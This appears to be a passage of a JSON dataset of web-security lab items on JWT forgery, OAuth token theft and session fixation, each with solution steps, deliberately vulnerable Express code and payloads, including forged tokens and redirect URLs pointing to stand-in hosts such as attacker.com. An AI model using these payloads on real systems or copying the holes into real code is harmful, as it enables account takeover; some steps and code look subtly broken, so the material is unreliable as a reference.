        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ \n    server,\n    handleProtocols: (protocols) => {\n        return protocols.includes('session-fixation') ? 'session-fixation' : false;\n    }\n});\n\nwss.on('connection', (ws, req) => {\n    const protocol = req.headers['sec-websocket-protocol'];\n    if (protocol.includes('session=')) {\n        ws.sessionId = protocol.split('session=')[1];\n    }\n    ws.send(`Connected with session: ${ws.sessionId}`);\n});",
        "payloads": [
            "GET /chat HTTP/1.1\r\nHost: vulnerable.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Protocol: session=fixed-session-id\r\n\r\n",
            "Sec-WebSocket-Protocol: session=attacker-controlled-id"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via insecure PKCE implementation",
        "Lab Description": "The application's OAuth PKCE flow fails to properly validate code verifier against code challenge. The vulnerable implementation allows bypassing PKCE protection through parameter manipulation. To solve: steal authorization code by intercepting and replaying requests with modified parameters.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Initiate OAuth flow and capture PKCE parameters in Burp Suite",
            "Intercept authorization code before redirection",
            "Remove code_verifier parameter from token request",
            "Modify code_challenge_method to 'plain'",
            "Exchange stolen code for access token without valid verifier"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst codes = {};\n\napp.get('/oauth/authorize', (req, res) => {\n    const { code_challenge, code_challenge_method } = req.query;\n    const code = `authcode_${Math.random().toString(36).substr(2)}`;\n    codes[code] = { challenge: code_challenge, method: code_challenge_method };\n    res.redirect(`/callback?code=${code}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n    const { code, code_verifier } = req.body;\n    if (!codes[code]) return res.status(400).send('Invalid code');\n    \n    const { method } = codes[code];\n    if (method === 'plain') {\n        res.json({ access_token: 'token_123' });\n    } else {\n        res.status(400).send('PKCE validation failed');\n    }\n});\n\napp.listen(3001);",
        "payloads": [
            "/oauth/authorize?code_challenge=plain&code_challenge_method=plain",
            "code=stolen_code&code_verifier=&code_challenge_method=plain",
            "{\"code\":\"stolen_code\",\"code_verifier\":null}"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "This lab's JWT implementation fails to validate the algorithm properly. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge an admin token by modifying your JWT without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Log in as a regular user and capture the JWT in Burp Suite",
            "2. Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
            "3. Change the 'alg' header to 'none' and modify the 'role' claim to 'admin'",
            "4. Remove the signature portion (set to empty string after the last dot)",
            "5. Submit the modified token in the Authorization header to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.header.alg === 'none') {\n      const payload = decoded.payload;\n      if (payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    }\n    res.status(403).send('Access denied');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "This lab's OAuth implementation fails to validate redirect URIs properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth code from the victim user and exchange it for an access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Intercept the OAuth flow in Burp Suite and note the redirect_uri parameter",
            "2. Craft a malicious link with your attacker server as redirect_uri",
            "3. Use Postman to simulate the victim clicking the link",
            "4. Capture the authorization code sent to your server",
            "5. Exchange the code for an access token using the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {'legit-client': {secret: 'abc123', redirect_uris: ['https://client.com/callback']}};\napp.get('/auth', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const code = 'RANDOM_CODE_' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'FAKE_ACCESS_TOKEN', token_type: 'bearer' });\n  } else {\n    res.status(401).send('Invalid client credentials');\n  }\n});\napp.listen(3001);",
        "payloads": [
            "https://oauth-lab.com/auth?client_id=legit-client&redirect_uri=https://attacker.com/callback",
            "https://oauth-lab.com/auth?client_id=legit-client&redirect_uri=http://localhost:9999/steal"
        ]
    },
    {
        "Lab scenario": "Session fixation via GraphQL mutation",
        "Lab Description": "This lab's GraphQL endpoint allows setting arbitrary session IDs through a mutation. The application doesn't regenerate session IDs after authentication. To solve: fixate a session ID and trick an admin into authenticating with it.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Use Postman to send a SetSession mutation with a predictable session ID",
            "2. Craft a CSRF payload containing the fixed session ID",
            "3. Induce the admin to visit your malicious page while monitoring traffic in OWASP ZAP",
            "4. When the admin authenticates, reuse the session ID to gain access",
            "5. Perform privileged actions through the GraphQL API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSession(id: String!): String\n  }\n  type Query {\n    getSecretData: String\n  }\n`);\nconst root = {\n  setSession: ({id}) => {\n    return `Session set to ${id}`;\n  },\n  getSecretData: () => {\n    return 'Sensitive data';\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.listen(4000);",
        "payloads": [
            "mutation { setSession(id: \"FIXATED_SESSION\") }",
            "{\"query\":\"mutation { setSession(id: \\\"ADMIN_SESSION\\\") }\"}"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "This lab's JWT validation improperly processes the kid header, allowing path traversal to arbitrary verification keys. The application blindly trusts the kid parameter when loading verification keys. To solve: forge a valid admin token by forcing the system to use a predictable public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Capture a valid JWT using Burp Suite and decode its headers",
            "2. Identify the kid parameter pointing to key storage location",
            "3. Modify the kid header to traverse to /dev/null or /proc/self/fd/0",
            "4. Set alg to HS256 and sign with an empty key",
            "5. Replace the original token with your forged version to gain admin access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst loadKey = (kid) => {\n    return fs.readFileSync(kid);\n};\n\napp.post('/verify', (req, res) => {\n    const token = req.body.token;\n    try {\n        const header = jwt.decode(token, {complete: true}).header;\n        const key = loadKey(header.kid);\n        const decoded = jwt.verify(token, key);\n        if(decoded.admin) {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Access denied');\n        }\n    } catch(e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJhZG1pbiI6dHJ1ZX0.7Z6nQkzX0zH6XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZmQvMCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1Q9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ9XJ6Z9XQ"
        ]
    },
    {
        "Lab scenario": "Session swapping via concurrent SOAP requests",
        "Lab Description": "This lab's SOAP API maintains session state improperly during concurrent requests. The application processes authentication and session updates asynchronously. To solve: perform a race condition attack to swap a low-privilege session with an admin session before authorization checks complete.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Capture valid login and session update requests in OWASP ZAP",
            "2. Identify the session ID parameter vulnerable to race conditions",
            "3. Craft 20 parallel requests mixing authentication and privilege escalation",
            "4. Use Postman's runner feature to send concurrent requests",
            "5. Verify session elevation by accessing admin-only endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst soap = require('express-soap');\nconst app = express();\n\nlet sessions = {};\n\napp.use('/soap', soap({\n    login: (args) => {\n        const user = authenticateUser(args);\n        sessions[args.sessionId] = {user: user, isAdmin: false};\n        return {success: true};\n    },\n    elevate: (args) => {\n        if(sessions[args.sessionId]) {\n            sessions[args.sessionId].isAdmin = true;\n        }\n        return {success: true};\n    }\n}));\n\napp.listen(3000);",
        "payloads": [
            "<soap:Envelope><soap:Body><login><sessionId>RACE_CONDITION</sessionId></login></soap:Body></soap:Envelope>",
            "<soap:Envelope><soap:Body><elevate><sessionId>RACE_CONDITION</sessionId></elevate></soap:Body></soap:Envelope>"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking via insecure PKCE implementation",
        "Lab Description": "This lab's OAuth flow implements PKCE security incorrectly by not verifying the code_challenge method. The application accepts arbitrary code_verifier values after authorization. To solve: intercept the authorization code and redeem it with a brute-forced code_verifier.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Initiate OAuth flow and capture authorization code in Burp",
            "2. Observe missing code_challenge_method validation",
            "3. Use sqlmap to brute-force the code_verifier parameter",
            "4. Intercept the token exchange request and insert valid verifier",
            "5. Capture the access token and access protected resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nlet authCodes = {};\n\napp.get('/authorize', (req, res) => {\n    const code = generateRandomCode();\n    authCodes[code] = {clientId: req.query.client_id};\n    res.redirect(`${req.query.redirect_uri}?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n    if(authCodes[req.body.code]) {\n        res.json({\n            access_token: 'FAKE_TOKEN',\n            token_type: 'Bearer'\n        });\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "code=SOME_CODE&code_verifier=BRUTE_FORCED_VALUE",
            "grant_type=authorization_code&code=STOLEN_CODE&code_verifier=000000"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "This lab's JWT implementation trusts arbitrary jku (JWK Set URL) headers for key verification. The application fails to validate the jku domain against an allowlist. To solve: host a malicious JWK Set and forge an admin token by forcing the server to use your public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Capture a valid JWT using Burp Suite and decode its headers",
            "2. Identify the vulnerable jku header parameter",
            "3. Generate a RSA key pair using OpenSSL",
            "4. Host a malicious JWK Set JSON file on your attacker server",
            "5. Craft a new token with jku pointing to your server and signed with your private key"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/verify', async (req, res) => {\n    const token = req.body.token;\n    try {\n        const header = jwt.decode(token, {complete: true}).header;\n        const jwks = await axios.get(header.jku);\n        const key = jwks.data.keys[0].x5c[0];\n        const decoded = jwt.verify(token, key);\n        if(decoded.admin) {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Access denied');\n        }\n    } catch(e) {\n        console.error('JWT verification failed:', e);\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2VydmVyLmNvbS9tYWxpY2lvdXMuanNvbiJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9rZXlzIn0.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
        ]
    },
    {
        "Lab scenario": "Session token leakage via GraphQL introspection",
        "Lab Description": "This lab's GraphQL endpoint has introspection enabled and leaks session tokens through error messages. The application improperly handles authentication errors in the GraphQL resolver. To solve: extract valid session tokens from verbose error responses and hijack an admin session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Use Postman to send malformed GraphQL queries triggering errors",
            "2. Analyze error responses in OWASP ZAP for leaked session tokens",
            "3. Extract valid tokens from error stack traces",
            "4. Identify admin tokens by checking privileges via introspection",
            "5. Reuse stolen tokens to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query {\n    getAdminData(token: String!): String\n  }\n`);\n\nconst root = {\n  getAdminData: ({token}) => {\n    try {\n      if(token === 'ADMIN_SECRET_TOKEN') {\n        return 'Sensitive admin data';\n      }\n      throw new Error(`Invalid token: ${token} provided`);\n    } catch(err) {\n      console.error('Full error:', err.stack);\n      throw err;\n    }\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
            "{\"query\":\"query { __schema { types { name } } }\"}",
            "{\"query\":\"query { getAdminData(token: \\\"invalid\\\") }\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token theft via open redirect with fragment",
        "Lab Description": "This lab's OAuth implementation is vulnerable to token leakage through an open redirect that preserves URL fragments. The application passes access tokens in the fragment during redirects but doesn't validate the target domain. To solve: craft a malicious redirect URL that captures the token fragment.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Initiate OAuth flow and intercept the redirect in Burp Suite",
            "2. Identify the redirect_uri parameter accepting arbitrary domains",
            "3. Craft a URL with your attacker domain and preserve the # fragment",
            "4. Induce the victim to click the malicious link",
            "5. Capture the token from your server logs and use it to access the API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n    const token = 'FAKE_TOKEN';\n    res.redirect(`${req.query.redirect_uri}#access_token=${token}`);\n});\n\napp.get('/authorize', (req, res) => {\n    res.redirect(`/oauth/callback?redirect_uri=${req.query.redirect_uri}`);\n});\n\napp.listen(3000);",
        "payloads": [
            "https://oauth-lab.com/authorize?redirect_uri=https://attacker.com/steal",
            "https://oauth-lab.com/authorize?redirect_uri=http://localhost:9999/capture#fragment"
        ]
    },
    {
        "Lab scenario": "Session fixation via WebSocket handshake",
        "Lab Description": "This lab's WebSocket implementation assigns session tokens during the handshake process without proper validation. The application accepts arbitrary session tokens in the WS upgrade request headers. To solve: fixate a session token and trick an admin into authenticating with it via WebSocket communication.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Use OWASP ZAP to intercept WebSocket connections",
            "2. Identify the Session-Token header in WS upgrade requests",
            "3. Craft a malicious WebSocket client with a fixed session token",
            "4. Induce admin to interact with your WebSocket endpoint",
            "5. Hijack the authenticated session using your pre-set token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst wss = new WebSocket.Server({ noServer: true });\nconst sessions = {};\n\napp.server = app.listen(3000);\napp.server.on('upgrade', (request, socket, head) => {\n    const token = request.headers['session-token'] || 'default';\n    sessions[token] = { authenticated: false };\n    \n    wss.handleUpgrade(request, socket, head, (ws) => {\n        ws.session = sessions[token];\n        wss.emit('connection', ws, request);\n    });\n});\n\nwss.on('connection', (ws) => {\n    ws.on('message', (message) => {\n        if(message === 'AUTH_SECRET') {\n            ws.session.authenticated = true;\n        }\n    });\n});",
        "payloads": [
            "GET / HTTP/1.1\\r\\nHost: localhost\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSession-Token: FIXATED_TOKEN\\r\\n\\r\\n",
            "{\"type\":\"auth\",\"token\":\"FIXATED_TOKEN\"}"
        ]
    },
    {
        "Lab scenario": "JWT timestamp manipulation via nbf claim",
        "Lab Description": "This lab's JWT validation improperly handles the 'nbf' (not before) claim when the server clock is skewed. The application fails to verify the timestamp against a trusted time source. To solve: forge a token with a future nbf claim and exploit clock drift to gain premature access.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Capture a valid JWT using Burp Suite and decode it",
            "2. Identify the nbf claim in the payload",
            "3. Craft a new token with nbf set far in the future",
            "4. Use Postman to send requests with the modified token",
            "5. Observe server accepts the token due to clock synchronization issues"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst secret = 'insecure_secret';\nconst futureDate = new Date();\nfutureDate.setFullYear(futureDate.getFullYear() + 1);\n\napp.get('/protected', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, secret, { clockTolerance: 300 });\n        res.send('Access granted');\n    } catch(e) {\n        console.error('JWT error:', e.message);\n        res.status(403).send('Access denied');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE5MDAwMDAwMDB9.INVALID_SIGNATURE",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYmYiOjQxNDcxOTQ0MDB9.INVALID_SIGNATURE"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via mixed content",
        "Lab Description": "This lab's OAuth implementation serves token responses over HTTP when initiated from HTTPS pages. The application fails to enforce strict transport security for token endpoints. To solve: perform a MITM attack to intercept tokens when victims visit mixed-content pages.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Identify OAuth endpoints loading over HTTP using Burp Suite",
            "2. Craft a malicious HTTPS page initiating OAuth flow",
            "3. Use OWASP ZAP to intercept the insecure token response",
            "4. Capture the access token from plaintext transmission",
            "5. Reuse the token to access protected resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/token', (req, res) => {\n    res.json({\n        access_token: 'INSECURE_TOKEN',\n        token_type: 'bearer',\n        expires_in: 3600\n    });\n});\n\napp.get('/authorize', (req, res) => {\n    const protocol = req.headers['x-forwarded-proto'] || req.protocol;\n    res.redirect(`${protocol}://${req.get('host')}/oauth/token`);\n});\n\napp.listen(3000);",
        "payloads": [
            "http://oauth-lab.com/authorize?response_type=token",
            "http://oauth-lab.com/oauth/token?grant_type=implicit"
        ]
    },
    {
        "Lab scenario": "JWT tampering due to lack of signature validation",
        "Lab Description": "This application's authentication mechanism uses JSON Web Tokens (JWTs) to manage user sessions. However, the backend fails to validate the signature of the JWT during decoding. The application trusts the payload content blindly. To solve: craft a tampered JWT to escalate from a regular user to admin and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Capture the JWT token issued after logging in as a regular user using Burp Suite's Proxy.",
          "Send the token to Burp Decoder and base64-decode its header and payload to observe structure and roles.",
          "Modify the 'alg' to 'none' and change 'role' to 'admin' in the payload.",
          "Re-encode the header and payload using base64 (URL-safe, no padding), concatenate them with a trailing dot.",
          "Replace the original token in the Authorization header with the tampered one and request /admin/dashboard.",
          "Verify admin access by confirming presence of admin-specific controls on the dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'user1', password: 'pass1', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username: user.username, role: user.role }, 'notsosecret'); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in URL",
        "Lab Description": "This application uses a custom session ID passed via the URL as a GET parameter. The backend sets the session without validating ownership, enabling an attacker to force a session ID on a victim before login. To solve: fix a session for Carlos, trick him into logging in, then reuse the session ID to hijack his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to generate a new session by visiting /login?session_id=attacker123.",
          "Copy the generated login URL and craft a phishing link targeting Carlos with the fixed session_id.",
          "Assume Carlos logs in with the provided session ID, which remains active.",
          "After login, reuse the same session_id=attacker123 from a different browser using Postman to access /my-account.",
          "Confirm session hijack by accessing Carlos’s account page or seeing personalized information."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sid = req.query.session_id; if (!sid) return res.send('No session ID provided'); sessions[sid] = null; res.send('<form action=\"/auth?session_id=' + sid + '\" method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/auth', (req, res) => { const { username, password } = req.body; const sid = req.query.session_id; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid] = user.username; res.redirect('/my-account?session_id=' + sid); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.query.session_id; if (sessions[sid]) { res.send('Welcome back, ' + sessions[sid]); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "http://victim-site.com/login?session_id=attacker123",
          "http://victim-site.com/my-account?session_id=attacker123"
        ]
      }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
  ]